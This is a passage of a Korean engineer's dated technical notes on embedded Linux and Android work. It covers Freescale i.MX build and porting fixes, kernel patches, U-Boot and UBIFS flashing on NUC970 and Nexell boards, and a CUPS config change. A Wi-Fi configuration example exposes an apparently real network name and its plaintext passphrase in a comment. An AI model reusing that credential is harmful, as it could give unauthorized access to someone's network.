[  151.311875] 7f00: 8048ac5c 1000406a 80477f2c 80477f18 80082eb4 80082d6c 00000000 803e35dc
[  151.320059] 7f20: 80477f64 80477f30 8008af18 80082e9c 80035ccc 8003000c 804d93e0 80476000
[  151.328243] 7f40: 804b5fa4 80487a64 8048ac5c 1000406a 412fc09a 00000000 80477f7c 80477f68
[  151.336427] 7f60: 80041ce4 8008aef0 80477f8c 00000000 80477f8c 80477f80 80036c10 80041c84
[  151.344611] 7f80: 80477fac 80477f90 80036e24 80036bf4 80476000 00000002 80029274 8c005100
[  151.352796] 7fa0: 80477fc4 80477fb0 803d116c 80036d84 80487b14 804b5f00 80477ff4 80477fc8
[  151.360979] 7fc0: 80008878 803d10ec 800082dc 00000000 00000000 80029274 10c53c7d 80487a60
[  151.369163] 7fe0: 80029270 8048ac54 00000000 80477ff8 1000803c 80008634 00000000 00000000
[  151.377342] Backtrace: 
[  151.379803] Function entered at [<8003c4d8>] from [<8008b29c>]
[  151.385638]  r4:8c008040 r3:8003c4d8
[  151.389241] Function entered at [<8008b26c>] from [<8008c4b0>]
[  151.395076]  r5:00000000 r4:804d9408
[  151.398678] Function entered at [<8008c39c>] from [<8008ba40>]
[  151.404512] Function entered at [<8008b7f0>] from [<80082dac>]
[  151.410347] Function entered at [<80082d60>] from [<80082eb4>]
[  151.416181]  r8:1000406a r7:8048ac5c r6:20000193 r5:80477f6c r4:00000004
[  151.422764] r3:ffffffff
[  151.425409] Function entered at [<80082e90>] from [<8008af18>]
[  151.431243] Function entered at [<8008aee4>] from [<80041ce4>]
[  151.437078] Function entered at [<80041c78>] from [<80036c10>]
[  151.442912] Function entered at [<80036be8>] from [<80036e24>]
[  151.448747] Function entered at [<80036d78>] from [<803d116c>]
[  151.454581]  r7:8c005100 r6:80029274 r5:00000002 r4:80476000
[  151.460294] Function entered at [<803d10e0>] from [<80008878>]
[  151.466128]  r5:804b5f00 r4:80487b14
[  151.469730] Function entered at [<80008628>] from [<1000803c>]
[  151.475568] Code: bad PC value
```


### <span class="section-num">3.261</span> error log freescale imx play video {#error-log-freescale-imx-play-video}

<span class="timestamp-wrapper"><span class="timestamp">&lt;2015-12-07 월 10:39&gt;</span></span>  
영상을 플레이하다 콘솔에 아래 에러 메시지를 계속 출력하면서 화면에는검은 화면만 출력되는 현상이 발생한다. 시스템 상에 메모리나 cpu 로드상에 특별한 이상은 없다. 이미 커뮤니티 상에 비슷한 질문이 있지만해결책은 아직 없다.  

```text
vss/mfw_gst_vss_common.c:1003 ioctl error, return -1
[244921.681828] imx-ipuv3 imx-ipuv3.1: IPU Warning - IPU_INT_STAT_5 = 0x88800000
[244921.689016] imx-ipuv3 imx-ipuv3.1: IPU Warning - IPU_INT_STAT_10 = 0x00080000
[244922.208974] mxc_sdc_fb mxc_sdc_fb.0: timeout when waiting for flip irq
vss/mfw_gst_vss_common.c:1003 ioctl error, return -1
[244922.432436] imx-ipuv3 imx-ipuv3.1: IPU Warning - IPU_INT_STAT_5 = 0x88800000
[244922.439631] imx-ipuv3 imx-ipuv3.1: IPU Warning - IPU_INT_STAT_10 = 0x00080000
[244922.958966] mxc_sdc_fb mxc_sdc_fb.0: timeout when waiting for flip irq
vss/mfw_gst_vss_common.c:1003 ioctl error, return -1
[244923.182168] imx-ipuv3 imx-ipuv3.1: IPU Warning - IPU_INT_STAT_5 = 0x88800000
[244923.189358] imx-ipuv3 imx-ipuv3.1: IPU Warning - IPU_INT_STAT_10 = 0x00080000
```

<https://community.freescale.com/thread/322574>  


### <span class="section-num">3.262</span> sarum lvds dclk - 74.25Mhz {#sarum-lvds-dclk-74-dot-25mhz}

<span class="timestamp-wrapper"><span class="timestamp">&lt;2015-12-21 월 11:12&gt;</span></span>  


### <span class="section-num">3.263</span> Freescale MX6 android 포팅(구버전 kk4.2) {#freescale-mx6-android-포팅--구버전-kk4-dot-2}

<span class="timestamp-wrapper"><span class="timestamp">&lt;2015-12-23 수 01:19&gt;</span></span>  


#### <span class="section-num">3.263.1</span> 포팅 순서 {#포팅-순서}

1.  환경 설정  
    oracle 자바를 설치하여야 한다. 사이트에서 패키지를 받아서데비안 패키지를 만들고 update-java-alternative 명령으로기본 java 환경을 oracle 자바로 설정한다.
2.  repo 를 이용하여 패키지를 받아온다.  
    안드로이드 소스와 커널, u-boot 패키지도 받는다.
3.  u-boot 는 리눅스 커널과 달리 android 설정에서  
    bootargs 설정을 하여야 제대로 동작한다. 그리고 안드로이드와커널을 boot param 설정을 모두 제거 하였다.
4.  펌웨어 라이팅시 사용하는 MFGTOOL 에서 custom 보드를 사용하기위해서는 커널과 uboot를 MFGTOOL용으로 빌드하여야하고 ucl.xml  
    파일을 수정하여야 한다. ucl.xml 파일에서 mmc 라이팅을 enable 하는부분이 있는데 이부분의 위치를 옮겨가며 수정하여야 한다.


### <span class="section-num">3.264</span> archlinux java 패키지 설정 {#archlinux-java-패키지-설정}

<span class="timestamp-wrapper"><span class="timestamp">&lt;2016-01-02 토 00:02&gt;</span></span>  

```text
ybgwon@23:59:52:[myandroid]$ archlinux-java status
Available Java environments:
  java-6-jdk (default)
  java-7-openjdk
ybgwon@00:01:50:[myandroid]$ sudo archlinux-java set java-7-openjdk
```


### <span class="section-num">3.265</span> Archlinux Freescale android Kitkat build {#archlinux-freescale-android-kitkat-build}

<span class="timestamp-wrapper"><span class="timestamp">&lt;2016-01-04 월 00:10&gt;</span></span>  

1.  python 버전이 2가 되어야 하므로 python virtualenv 환경에서 빌드한다.
2.  java 버전이 6가 되어야 하므로 sun java6 를 설치하고  
    archlinux-java set 명령으로 default 버전을 java6으로 변경한다.
3.  perl defined(@array) 관련 에러가 발생하면  
    defined() 부분을 제거한다.
4.  파이썬 관련 에러가 발생하면 python shebang 지시어를  
    \#!/usb/bin/python2 로 변경한다.  
    
    ```text
    에러 내용중...
    art/tools/generate-operator-out.py line 153
    ```
5.  redefinition of hashtable\_iterator\_key 에러가 발생하면 mtd 관련패치를 한다  
    <https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=778017File>


### <span class="section-num">3.266</span> Freescale android patch 가 리셋되는 현상 {#freescale-android-patch-가-리셋되는-현상}

<span class="timestamp-wrapper"><span class="timestamp">&lt;2016-01-08 금 16:53&gt;</span></span>  
커널및 uboot에 git branch 생성 작업을 하고 어느 순간인가빌드시 PCM\_HW\_PARAM\_RATE tinyalsa 빌드관련 에러가 나면서빌드가 안된다. 어떤 이유에서인지 freescale관련 패치가모두 리셋되어 버렸다.  


### <span class="section-num">3.267</span> cups server error {#cups-server-error}

<span class="timestamp-wrapper"><span class="timestamp">&lt;2016-01-18 월 19:40&gt;</span></span>  
프린터 설정하다 cups 서버가 동작하지 않는 문제가 발생했다.  
/etc/cups/cupsd.conf 파일을 수정하였다.  

```text
--- cupsd.conf	2016-01-18 18:38:42.734364301 +0900
+++ cupsd.conf.O	2016-01-13 11:44:28.771879317 +0900
@@ -1,6 +1,7 @@
+# Show general information in error_log.
 LogLevel warn
 MaxLogSize 0
-Listen localhost:631
+Listen /var/run/cups/cups.sock
 Listen /var/run/cups/cups.sock
 Browsing On
 BrowseLocalProtocols dnssd
@@ -79,9 +80,8 @@
   <Limit All>
     Order deny,allow
   </Limit>
-
+</Policy>
 JobPrivateAccess default
 JobPrivateValues default
 SubscriptionPrivateAccess default
 SubscriptionPrivateValues default
-</Policy>
\ No newline at end of file
```

<http://ubuntuforums.org/showthread.php?t=2278343>  


### <span class="section-num">3.268</span> EB 나주 BMS 빌드 정리 {#eb-나주-bms-빌드-정리}

<span class="timestamp-wrapper"><span class="timestamp">&lt;2016-01-27 수 03:29&gt;</span></span>  


#### <span class="section-num">3.268.1</span> 이클립스 설정 {#이클립스-설정}

1.  sun-java-jdk6 버전을 다운받아 설치하고 default 자바로 설정
2.  이클립스 설치후 help 메뉴에서 ADT 플러그인 설치  
    
    ```text
    Help -> Install New Software
    ADT - http://dl-ssl.google.com/android/eclipse
    ```
3.  Android SDK 설치  
    SDK Manager 에서 android api 17 버전 도 함께 설치  
    <http://dkatlf900.tistory.com/36>
4.  Android NDK 설치
5.  이클립스 실행후 Window -> Prefrences 메뉴에서다음이 맞는지 확인  
    -   Android 항목에서 sdk 위치가 맞는지 확인
    -   Android -> NDK 항목 에서 NDK 위치가 맞는지 확인
    -   상단 텍스트 필드에서 encod 로 검색  
        C source file encoding 을 euc-kr로 변경
6.  프로젝트 import
7.  프로젝트 properties 에서 다음이 맞는지 확인  
    -   Builders -> jni\_builder 에서  
        Location : ndk-build command 위치 맞는지 확인  
        Working Directory 위치 맞는지 확인
    -   Java Build Path -> Library 탭에서  
        Add Jars 버턴 클릭. lib 디렉토리 아래 jar 파일을 최상위위치로 add


### <span class="section-num">3.269</span> NUC970 {#nuc970}

<span class="timestamp-wrapper"><span class="timestamp">&lt;2016-02-01 월 19:02&gt;</span></span>  


#### <span class="section-num">3.269.1</span> uboot param {#uboot-param}

1.  boot Linux kernel in NAND flash  
    
    ```text
    U-Boot> nboot 0x7fc0 0 0x200000
    U-Boot> bootm 0x7fc0
    ```
2.  tftp  
    
    ```text
    set bootcmd "tftp 0x7fc0 vmlinux.ub; bootm 0x7fc0"
    ```


#### <span class="section-num">3.269.2</span> kernel boot args {#kernel-boot-args}

1.  ramdisk  
    
    ```text
    set bootargs "root=/dev/ram0 console=ttyS0,115200n8 rdinit=/sbin/init mem=64M mtdparts=nand0:0x200000@0x0(u-boot),0x1400000@0x200000(kernel),-(user)"
    ```
2.  yaffs2  
    
    ```text
    noinitrd root=/dev/mtdblock2 rootfstype=yaffs2 rootflags=inband-tags console=ttyS0, 115200n8 rdinit=/sbin/init mem=64M
    ```
3.  ubifs  
    
    ```text
    noinitrd ubi.mtd=2 root=ubi0:system rw rootfstype=ubifs console=ttyS0, 115200n8 rdinit=/sbin/init mem=64M
    ```
4.  nfs  
    
    ```text
    noinitrd root=/dev/nfs nfsroot=10.11.12.131:/srv/nfs/rootfs ip=10.11.12.132:10.11.12.131:10.11.12.254:255.255.255.0 console=ttyS0,115200n8 rdinit=/sbin/init mem=64M
    ```


#### <span class="section-num">3.269.3</span> ubifs {#ubifs}

1.  make  
    
    ```text
    $ sudo mkfs.ubifs -F -x lzo -m 2048 -e 126976 -c 732 -o rootfs_ubifs.img -d ./rootfs 
    # sudo ubinize -o ubi.img -m 2048 -p 131072 -O 2048 -s 2048 rootfs_ubinize.cfg 
    ```
2.  mount  
    
    ```text
    $ ubiattach /dev/ubi_ctrl -p /dev/mtd2
    $ mount -t ubifs ubi0:system /opt
    ```
3.  info  
    
    ```text
    device nand0 <nand0>, # parts = 3
    #: name                size            offset          mask_flags
    0: u-boot              0x00200000      0x00000000      0
    1: kernel              0x01400000      0x00200000      0
    2: user                0x06a00000      0x01600000      0
    
    active partition: nand0,0 - (u-boot) 0x00200000 @ 0x00000000
    
    defaults:
    mtdids  : nand0=nand0
    mtdparts: mtdparts=nand0:0x200000@0x0(u-boot),0x1400000@0x200000(kernel),-(user)
    ```


### <span class="section-num">3.270</span> mx6 볼륨 조절및 mp3 플레이 {#mx6-볼륨-조절및-mp3-플레이}

<span class="timestamp-wrapper"><span class="timestamp">&lt;2016-02-24 수 18:47&gt;</span></span>  

1.  volume  
    
    ```text
    $ amixer set PCM 50%
    좌우 볼륨을 다르게 하려면
    $ amixer set PCM 0%,70%
    ```
2.  mp3 플레이  
    
    ```text
    $ madplay -m -o wave:- taeyeon.mp3 | aplay -f cd
    ```


### <span class="section-num">3.271</span> change API error {#change-api-error}

<span class="timestamp-wrapper"><span class="timestamp">&lt;2016-03-18 금 13:00&gt;</span></span>  
시스템을 변경하고 백업한 안드로이드 소스를 빌드시 아래와 같은 에러가나타났다.  

```text
You have tried to change the API from what has been previously released in
an SDK.  Please fix the errors listed above.
```

해결책은 api를 update 해야 한다.  

```text
$ make update-api
$ make
```

<http://elecs.tistory.com/60>  


### <span class="section-num">3.272</span> emmc revision fetch {#emmc-revision-fetch}

<span class="timestamp-wrapper"><span class="timestamp">&lt;2016-03-19 토 16:50&gt;</span></span>  
emmc 5.0, 5.1 버전이 올라가면서 mfgtools 로 writing 이 되지 않을때아래 패치를 한다.  

```text
drivers/mmc/core/mmc.c |    2 +-
1 file changed, 1 insertion(+), 1 deletion(-)

diff --git a/drivers/mmc/core/mmc.c b/drivers/mmc/core/mmc.c
index 2bd67d5..0058957 100644
--- a/drivers/mmc/core/mmc.c
+++ b/drivers/mmc/core/mmc.c
@@ -260,7 +260,7 @@ static int mmc_read_ext_csd(struct mmc_card *card, u8 *ext_csd)
 
 	card->ext_csd.rev = ext_csd[EXT_CSD_REV];
 	/* workaround: support emmc 4.5 cards to work at emmc 4.4 mode */
-	if (card->ext_csd.rev > 6) {
+	if (card->ext_csd.rev > 7) {
 		printk(KERN_ERR "%s: unrecognised EXT_CSD revision %d\n",
 			mmc_hostname(card->host), card->ext_csd.rev);
 		err = -EINVAL;
```

emmc 5.0 은 버전 7 emmc 5.1 은 버전 8 이다.  


### <span class="section-num">3.273</span> mfgtools 용 커널 빌드 에러 {#mfgtools-용-커널-빌드-에러}

<span class="timestamp-wrapper"><span class="timestamp">&lt;2016-03-19 토 21:22&gt;</span></span>  
mfgtools용 커널을 빌드하려면 커널설정을 아래 명령으로 변경한다.  

```text
$ make imx6_updater_defconfig
```

명령후 빌드시 아래 에러가 나는데 커널에서  
CONFIG\_SWITCH 를 활성화 하여야 한다.  

```text
drivers/built-in.o: In function `mxc_hdmi_remove':

clkdev.c:(.text+0x1078c): undefined reference to `switch_dev_unregister'

clkdev.c:(.text+0x10798): undefined reference to `switch_dev_unregister'

drivers/built-in.o: In function `hotplug_worker':

clkdev.c:(.text+0x12608): undefined reference to `switch_set_state'

clkdev.c:(.text+0x12618): undefined reference to `switch_set_state'

clkdev.c:(.text+0x12818): undefined reference to `switch_set_state'

clkdev.c:(.text+0x12828): undefined reference to `switch_set_state'

drivers/built-in.o: In function `mxc_hdmi_probe':

clkdev.c:(.devinit.text+0x3c8): undefined reference to `switch_dev_register'

clkdev.c:(.devinit.text+0x3d4): undefined reference to `switch_dev_register'

make: *** [.tmp_vmlinux1] Error 1
```

<https://community.freescale.com/thread/307477>\\  


### <span class="section-num">3.274</span> firefox menukey access disable {#firefox-menukey-access-disable}

<span class="timestamp-wrapper"><span class="timestamp">&lt;2016-03-19 토 21:53&gt;</span></span>  
firefox 사용시 alt 키가 menu를 enable 하지 않도록 하려면아래를 설정한다.  

```text
1. 주소창에서 about:config
2. ui.key로 검색
3. ui.key.menuAccessKey = 0
4. ui.key.menuAccessKeyFocuses = false
```


### <span class="section-num">3.275</span> broadcom bluetooth 설정 {#broadcom-bluetooth-설정}

<span class="timestamp-wrapper"><span class="timestamp">&lt;2016-04-27 수 17:04&gt;</span></span>  
freescale android 소스에 bluetooth 관련 사항이 이미 포팅되어있다.(kitkat 4.4.2 기준)  
커널에서 mux 를 설정하고 android 에서 밴더 펌웨어와 설정 파일정도복사하면 잘 동작한다.  

1.  kernel mux 설정
2.  myandroid/kernel\_imx/arch/arm/mach-mx6/board-mx6q\_sabresd.c  
    파일에서 bluetooth 관련 enable.
3.  hardware/broadcom/lib-bt 디렉토리아래 uart 포트및 밴더 펌웨어관련 설정


### <span class="section-num">3.276</span> broadcom wifi android 포팅 {#broadcom-wifi-android-포팅}

<span class="timestamp-wrapper"><span class="timestamp">&lt;2016-04-27 수 17:18&gt;</span></span>  
broadcom wifi 드라이버는 broadcom engineer 가 와서 소스를 주고테스트까지 해준다. 원래 open source 드라이버 말고 제공받은 드라이버를사용하면 된다. 커널단에서는 단지 제공받은 드라이버를 enable 해주기만하면 된다. 안드로이드에서 밴더 펌웨어와 설정 파일 복사등의 작업이이루어지면 동작한다.  

1.  kernel config 에서 bcmdhd 모듈 enable
2.  init.rc 파일에서 기본 athros wifi 를 disable 하고 bcmdhd enable
3.  external/wpa\_supplicant\_8 디렉토리 아래 compile 에러 수정
4.  hardware/libhardware\_legacy 아래 wifi.c 수정


### <span class="section-num">3.277</span> ov5640 mipi 카메라 설정 {#ov5640-mipi-카메라-설정}

<span class="timestamp-wrapper"><span class="timestamp">&lt;2016-04-27 수 18:45&gt;</span></span>  
ov5640 mipi 카메라의 경우 freescale 보드에서 기본 포팅되어 있는카메라이므로 mux 설정하고 i2c 포트만 맞추어 주면 동작한다.  


### <span class="section-num">3.278</span> flashplugin {#flashplugin}

<span class="timestamp-wrapper"><span class="timestamp">&lt;2016-06-09 목 23:42&gt;</span></span>  
firefox flashplugin 이 아래와 같은 메시지를 내면서 업데이트를강요한다. 귀찮은 메시지를 없애는 방법이 있다.  

```text
- 메시지
Firefox has prevented the outdated plugin "XXXX" from running on ...
- 해결방법
flashplugin을 업데이트하거나 아래 파일을 삭제한다.
~/.mozilla/firefox/some name.default/pluginreg.dat
```


### <span class="section-num">3.279</span> sbload {#sbload}

<span class="timestamp-wrapper"><span class="timestamp">&lt;2016-07-29 금 14:55&gt;</span></span>  
imx28은 mfgtools이 오래된 버전이라 sdloader를 사용하거나  
windows xp를 설치하여 사용하여야 한다.  
sbloader 를 이용하여 imx28 보드를 usb 부팅하여 nand 에  
ubifs image 를 라이팅할 수 있다.  

1.  보드 USB 부팅 모드 설정 - 점퍼 모드 0로 셋팅
2.  usb cable 을 연결한후 보드를 리셋한다.
3.  윈도우 도스창(cmd.exe)에서 아래 명령 실행  
    
    ```text
    C:\Freescale\sb_loader> sb_loader.exe /f imx28_ivt_linux.sb
    ```
4.  보드 부팅후 시리얼 콘솔에서 라이팅  
    NFS연결후 mk\_ubi 명령 실행  
    
    ```text
    $ cat mk_ubi
    #!/bin/sh
    if [ $# -ne 1 ]; then
     echo "Usage: $0 [kernel|rootfs|all]"
    fi
    if [ $1 = "kernel" -o $1 = "all" ]; then
     echo "flash_erase /dev/mtd0 0 0"
     flash_erase /dev/mtd0 0 0
     sync
     echo "Write imx28_ivt_linux.sb"
     kobs-ng init imx28_ivt_linux.sb
     sync
    fi
    if [ $1 = "rootfs" -o $1 = "all" ]; then
     echo "flash_erase /dev/mtd1 0 0"
     flash_erase /dev/mtd1 0 0
     sync
     if [ -b ubiblka ]; then
         ubidetach /dev/ubi_ctrl -d 0
     fi
     ubiattach /dev/ubi_ctrl -d 0 -m 1
     /usr/bin/ubimkvol /dev/ubi0 -N rootfs -s 128MiB
     /usr/bin/ubimkvol  /dev/ubi0 -N data -m
     echo "Write rootfs.ubifs..."
     ubiupdatevol /dev/ubi0_0 rootfs.ubifs
     sync
    fi
    echo "Operation Complete"
    ```


### <span class="section-num">3.280</span> prototype error {#prototype-error}

<span class="timestamp-wrapper"><span class="timestamp">&lt;2016-09-19 월 12:36&gt;</span></span>  
컴파일시 아래와 같은 오류 발생시 함수 인자에 void를 넣어주고 해결  

```text
/home/ybgwon/src/external/rtl8635/module/rtl8365.c:92:19: 
error: function declaration isn't a prototype [-Werror=strict-prototypes]
 static int __init mdio_8365MB_init()
```

아래와 같이 수정  

```text
static int __init mdio_8365MB_init(void)
```


### <span class="section-num">3.281</span> Freescale Linux 4.1.15\_2.00 build on debian stretch {#freescale-linux-4-dot-1-dot-15-2-dot-00-build-on-debian-stretch}

<span class="timestamp-wrapper"><span class="timestamp">&lt;2016-10-29 토 19:43&gt;</span></span>  


#### <span class="section-num">3.281.1</span> build error {#build-error}

1.  ACC conformance test failed  
    lzop build 에러시 아래 패치 적용  
    
    ```text
    +--- a/src/miniacc.h
    ++++ b/src/miniacc.h
    +@@ -4461,12 +4461,12 @@
    ​+ #if defined(__MSDOS__) && defined(__TURBOC__) && (__TURBOC__ < 0x0150)
    ​+ #elif 1 && (ACC_CC_SUNPROC) && !defined(ACCCHK_CFG_PEDANTIC)
    ​+ #else
    +-    ACCCHK_ASSERT((1   << (8*SIZEOF_INT-1)) < 0)
    ++    ACCCHK_ASSERT((int)(1u   << (8*SIZEOF_INT-1)) < 0)
    ​+ #endif
    ​+     ACCCHK_ASSERT((1u  << (8*SIZEOF_INT-1)) > 0)
    ​+ #if 1 && (ACC_CC_SUNPROC) && !defined(ACCCHK_CFG_PEDANTIC)
    ​+ #else
    +-    ACCCHK_ASSERT((1l  << (8*SIZEOF_LONG-1)) < 0)
    ++    ACCCHK_ASSERT((long)(1ul  << (8*SIZEOF_LONG-1)) < 0)
    ​+ #endif
    ​+     ACCCHK_ASSERT((1ul << (8*SIZEOF_LONG-1)) > 0)
    ​+ #if defined(acc_int16e_t)
    +@@ -4695,7 +4695,7 @@
    ​+ #elif 1 && (ACC_CC_LCC || ACC_CC_LCCWIN32) && !defined(ACCCHK_CFG_PEDANTIC)
    ​+ #elif 1 && (ACC_CC_SUNPROC) && !defined(ACCCHK_CFG_PEDANTIC)
    ​+ #elif !(ACC_BROKEN_INTEGRAL_PROMOTION) && (SIZEOF_INT > 1)
    +-    ACCCHK_ASSERT( (((unsigned char)128) << (int)(8*sizeof(int)-8)) < 0)
    ++    ACCCHK_ASSERT( (int)((unsigned int)((unsigned char)128) << (int)(8*sizeof(int)-8)) < 0)
    ​+ #endif
    ​+ #if (ACC_CC_BORLANDC && (__BORLANDC__ >= 0x0530) && (__BORLANDC__ < 0x0560))
    ​+ #  pragma option pop
    ```
    
    <https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=812054>
2.  pseudo 패치메시지  
    
    ```text
    WARNING: core-image-minimal-1.0-r0 do_rootfs: No not found in the base feeds (qemux86_64 core2-64 x86_64 noarch any all)
    WARNING: core-image-minimal-1.0-r0 do_rootfs: real not found in the base feeds (qemux86_64 core2-64 x86_64 noarch any all).
    WARNING: core-image-minimal-1.0-r0 do_rootfs: function not found in the base feeds (qemux86_64 core2-64 x86_64 noarch any all).
    WARNING: core-image-minimal-1.0-r0 do_rootfs: for not found in the base feeds (qemux86_64 core2-64 x86_64 noarch any all).
    WARNING: core-image-minimal-1.0-r0 do_rootfs: mknod: not found in the base feeds (qemux86_64 core2-64 x86_64 noarch any all).
    ```
    
    아래 사이트에서 패치를 다운받아 패치 실행  
    <https://patchwork.openembedded.org/patch/123001/>


### <span class="section-num">3.282</span> Nexell Linux BSP build {#nexell-linux-bsp-build}

<span class="timestamp-wrapper"><span class="timestamp">&lt;2017-01-17 화 12:41&gt;</span></span>  


#### <span class="section-num">3.282.1</span> source download {#source-download}

```text
$ repo init -u git://git.nexell.co.kr/nexell/linux/manifest -b linux-avn-release_3rd
$ repo sync
```


#### <span class="section-num">3.282.2</span> toolchain {#toolchain}

```text
$ tar zxvf platform/common/tools/crosstools/arm-cortex_a9-eabi-eglibc-2.18.tar.gz\
-C /opt/crosstools
$ export PATH=$PATH:/opt/crosstools/arm-cortex_a9-eabi-eglibc-2.18/bin/
```


#### <span class="section-num">3.282.3</span> config {#config}

```text
$ vi bootloader/u-boot-2014.07/board/s5p4418/navi_ref/config.mk
```


#### <span class="section-num">3.282.4</span> build u-boot {#build-u-boot}

```text
$ make s5p4418_navi_ref_linux_config
$ make -j8 -sw
```


#### <span class="section-num">3.282.5</span> build kernel {#build-kernel}

```text
$ make ARCH=arm s5p4418_navi_ref_linux_defconfig
$ make ARCH=arm uImage -j8 -sw
```


#### <span class="section-num">3.282.6</span> build buildroot {#build-buildroot}

```text
$ cd platform/common/fs/buildroot/buildroot-2015.02
$ cp ../configs/br.2015.02.cortex_a9_glibc_tiny_rfs.config .
$ make menuconfig
$ make
```


#### <span class="section-num">3.282.7</span> make ramdisk {#make-ramdisk}

```text
$ cd platform/common/fs/buildroot/out
$ cp ../scripts/mk_ramfs.sh .
$ ./mk_ramfs.sh -r rootfs -s 49152
```

mk\_ramfs 에서 지정한 사이즈 보다 리눅스 kernel config 설정값이커야 한다.  


#### <span class="section-num">3.282.8</span> usb boot {#usb-boot}

```text
$ cd platform/s5p4418/result
$ sudo ../../common/tools/bin/usb-downloader -t nxp4330 \
-n nsih_navi_ref_usb.txt -b 2ndboot_navi_ref_usb.bin
$ sudo ../../common/tools/bin/usb-downloader -t nxp4330 \
-f u-boot.bin -a 0x43c00000 -j 0x43c00000
```


#### <span class="section-num">3.282.9</span> writing bootloader SD/MMC {#writing-bootloader-sd-mmc}

1.   2ndboot download

    1.   usb boot후 u-boot 에서 아래 실행
    
        ```text
        $ fdisk 0 5 0x200:0x7E00 0x8000:0x70000 0x100000:500000 0x700000:0x3000000 0x3700000:0x0
        $ udown 0x48000000
        ```
    
    2.   host pc 에서
    
        ```text
        $ ../../common/tools/bin/BOOT_BINGEN -c s5p4418 -t 2ndboot \
        -n nsih_navi_ref_sdmmc.txt -i 2ndboot_navi_ref_sdmmc.bin -o 2ndboot_navi_ref.bin
        $ sudo ../../common/tools/bin/usb-downloader -t nxp4330 -f 2ndboot_navi_ref.bin 
        ```

2.   u-boot download

    1.   uboot
    
        ```text
        $ udown 0x49000000
        ```
    
    2.   host pc
    
        ```text
        $ sudo ../../common/tools/bin/usb-downloader -t nxp4330 -f u-boot.bin
        ```

3.   writing 2ndboot and u-boot

    uboot 에서  
    
    ```text
    $ update_mmc 0 2ndboot 48000000 200 7E00
    $ update_mmc 0 boot 49000000 8000 70000
    ```


#### <span class="section-num">3.282.10</span> Writing Kernel {#writing-kernel}

1.   u-boot

    ```text
    $ udown 48000000
    ```

2.   host-pc

    ```text
    $ sudo ../../common/tools/bin/usb-downloader -t nxp4330 -f uImage
    ```

3.   u-boot

    ```text
    $ mmc dev 0
    $ mmc write 48000000 800 2800
    ```


#### <span class="section-num">3.282.11</span> Writing Ramdisk {#writing-ramdisk}

1.   u-boot

    ```text
    $ udown 49000000
    ```

2.   host-pc

    ```text
    $ sudo ../../common/tools/bin/usb-downloader -t nxp4330 -f ramdisk.gz
    ```

3.   u-boot

    ```text
    $ mmc write 49000000 3800 18000
    ```


#### <span class="section-num">3.282.12</span> u-boot 환경 변수 {#u-boot-환경-변수}

```text
$ setenv bootargs 'console=ttyAMA3,115200n8 root=/dev/ram0 rw \
initrd=0x49000000,48M ramdisk_size=49152 debug'
```


#### <span class="section-num">3.282.13</span> fastboot {#fastboot}

1.   u-boot

    ```text
    $ setenv fastboot 'flash=mmc,0:2ndboot:2nd:0x200,0x7E00;\
    flash=mmc,0:bootloader:boot:0x8000,0x70000;\
    flash=mmc,0:kernel:raw:0x100000,0x500000;\
    flash=mmc,0:ramdisk:raw:0x700000,0x3000000;\
    flash=mmc,0:userdata:ext4:0x3700000,0x0;'
    $ fastboot
    ```

2.   host-pc

    ```text
    $ sudo fastboot flash 2ndboot 2ndboot_navi_ref.bin
    $ sudo fastboot flash bootloader u-boot.bin
    $ sudo fastboot flash kernel uImage
    $ sudo fastboot flash ramdisk ramdisk.gz
    ```


#### <span class="section-num">3.282.14</span> build script {#build-script}

```text
$ platform/common/tools/build.sh s5p4418 navi_ref sdmmc
```


#### <span class="section-num">3.282.15</span> usb wireless lan {#usb-wireless-lan}

1.   wpa\_supplicant.conf

    ```text
    ctrl_interface=/var/run/wpa_supplicant
    update_config=1
    fast_reauth=1
    ap_scan=1
    network={
            ssid="areinfo1"
            #psk="areinfo2016"
            psk=999eff58c104d38774aadec16622f77cf33b379812a08c3876478f8f6f675730
    }
    
    #network={
    #        ssid="areinfo2"
    #        #psk="areinfo2016"
    #        psk=6d7cfda5bb762d229b58b8dc08abd7e105ae9892c29312b95061152ffe5775b4
    #}
    ```

2.   connect

    ```text
    $ insmod 8188eu.ko
    $ wpa_supplicant -B -i wlan0 -c /etc/wpa_supplicant/wpa_supplicant.conf
    $ udhcpc -i wlan0
    ```


### <span class="section-num">3.283</span> userdata.img 만들기 {#userdata-dot-img-만들기}

<span class="timestamp-wrapper"><span class="timestamp">&lt;2017-02-09 목 19:12&gt;</span></span>  

1.  -l 옵션에 size를 지정한다.
2.  첫번째 arguments에 생성할 파일명을 지정한다.
3.  두번째 arguments에 image에 추가할 파일들이 있는 디렉토리를 지정한다.

<!--listend-->

```text
./make_ext4fs -s -l 7760510976 userdata.img $target
```

-s 옵션이 무엇인지는 모르겠다.  

<http://omappedia.org/wiki/Android%5FeMMC%5FBooting#Modifying%5F.IMG%5FFiles>  


### <span class="section-num">3.284</span> Freescale Android 5.1.1 Lollipop build {#freescale-android-5-dot-1-dot-1-lollipop-build}

<span class="timestamp-wrapper"><span class="timestamp">&lt;2017-02-11 토 15:54&gt;</span></span>  

1.  make source directory  
    make Android(a)/Lollipop(llp) source directory and link  
    
    ```text
    $ mkdir ~/a/android-5.1.1-r1-Lollipop; cd ~/a
    $ ln -s android-5.1.1-r1-Lollipop llp
    ```
2.  repo sync  
    
    ```text
    $ cd ~/a/llp
    $ repo init -u https://android.googlesource.com/platform/manifest -b android-5.1.1_r1
    $ repo sync
    ```
3.  checkout gcc-4.0  
    default GCC toolchain from android-5.1.1\_r1 release is GCC4.8  
    which may have issues on ARM Linux kernel compiling,  
    the GCC 4.0 from android-4.4.3\_r1 is used to compile the Linux Kernel and U-Boot.  
    
    ```text
    $ cd ~/a/llp/prebuilts/gcc/linux-x86/arm
    $ git clone https://android.googlesource.com/platform/prebuilts/gcc/linux-x86/arm/arm-eabi-4.6
    $ cd arm-eabi-4.6
    $ git checkout android-4.4.3_r1
    ```
4.  checkout kernel  
    
    ```text
    $ cd ~/a/llp
    $ git clone git://git.freescale.com/imx/linux-2.6-imx.git kernel_imx 
    $ cd kernel_imx
    $ git checkout l5.1.1_2.1.0-ga
    ```
5.  checkout u-boot  
    
    ```text
    $ cd ~/a/llp/bootable/bootloader
    $ git clone git://git.freescale.com/imx/uboot-imx.git uboot-imx
    $ cd uboot-imx
    $ git checkout l5.1.1_2.1.0-ga
    ```
6.  patch  
    
    ```text
    $ cd ~/a/llp
